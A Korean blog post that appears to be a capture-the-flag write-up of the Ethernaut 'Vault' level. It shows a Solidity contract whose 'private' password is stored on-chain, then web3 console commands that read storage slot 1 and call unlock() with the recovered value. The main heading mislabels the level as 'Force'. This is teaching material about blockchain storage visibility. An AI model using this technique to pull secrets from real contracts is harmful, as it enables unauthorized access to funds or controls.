---
emoji: 🧢
title: (Ethernaut 취약점 8) Vault
date: '2022-01-10 19:18:00'
author: 한성원
tags: ethernaut Vault vulnerability
categories: 취약점분석
---


# 👋 Force
__Difficulty 3/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- vault를 unlock하면 승리한다.
- locked 변수를 false로 만들기

- - -

## 코드 분석
분석은 주석에!

```solidity
contract Vault {

    bool public locked;
    
    // private으로 정의된 비밀번호
    bytes32 private password;

    // constructor: password를 parameter로 받음
    constructor(bytes32 _password) public {
        // valut의 lock을 건다
        locked = true;
        // parameter password를 private 변수에 저장
        password = _password;
    }

    // 올바른 비밀번호를 입력하면 vault를 unlock할 수 있는 function
    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
- - -

## 풀이
이 문제에서 우리의 목표는 vault를 unlock하는 것이다.

위에 코드에서 보다싶이 우리는 올바른 비밀 번호를 가지고 unlock()을 실행시키면 vault를 unlock 할 수 있다는 것을 알 수 있다. 여기서 유심히 봐야할 점은 password가 smart contract에 저장되어 있다는 점이다. 블록체인 특성상 private으로 정의되었어도 외부에서 정보를 확인할 수 있다.

모든 코드는 console창에서 이루어진다. 
ctrl + shift + i를 눌러 console창을 활성화 시키자
```javascript
// 우리는 web3 library를 사용한다.
// getStorageAt API를 사용하여 storage의 slot 1에 저장되어 있는 32 bytes의 data를 가져온다.
// 결과 값: 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
await web3.eth.getStorageAt(instance, 1)

// 얻은 password와 함꼐 unlock()을 실행시키면 vault가 unlock 된다!
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

// 얻은 password를 우리가 읽을 수 있게 바꾸고 싶다면?
// 결과 값: 'A very strong secret password :)'
await web3.utils.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

```

Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```
- - -

## 마무리
이 문제를 완벽하게 이해하기 위해서는 slot, 즉 storage에 대한 깊은 이해가 필요하다. slot은 2^256개가 존재하며 각각 32 bytes를 store할 수 있다. variable type에 따라 하나의 slot에 여러개의 변수가 저장될 수 있으며 slot의 우측에서부터 저장된다.

- - -
## 기타 정보
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- selfdestruct 취약점: https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/

```toc

```